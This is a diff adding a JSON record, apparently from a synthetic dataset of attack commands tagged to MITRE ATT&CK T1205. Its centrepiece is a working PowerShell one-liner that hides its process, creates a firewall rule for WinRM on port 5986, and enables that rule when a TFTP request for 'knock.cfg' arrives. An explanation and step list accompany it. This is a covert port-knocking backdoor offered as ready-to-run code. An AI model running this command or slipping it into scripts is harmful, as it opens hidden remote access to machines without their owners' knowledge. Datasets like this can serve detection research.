@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(69); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 4 -and $d[0] -eq 0 -and $d[1] -eq 1){ $i=2; $bytes=@(); while($i -lt $d.Length -and $d[$i] -ne 0){ $bytes+=$d[$i]; $i++ }; $fn=[Text.Encoding]::ASCII.GetString($bytes,0,$bytes.Length); if($fn -eq ''knock.cfg''){ Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Enabled True -RemoteAddress $ep.Address; break } } } }'",
+  "explanation": "Monitors TFTP (UDP/69) RRQ packets (opcode 0x0001) and parses the filename field. A request for 'knock.cfg' serves as the signal to enable the WinRM HTTPS firewall rule for the requesting host.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/5986.",
+    "Bind to UDP/69 and parse RRQ (opcode 1) filename per TFTP format.",
+    "Enable the firewall rule when the sentinel filename is requested."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-d47832aa",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
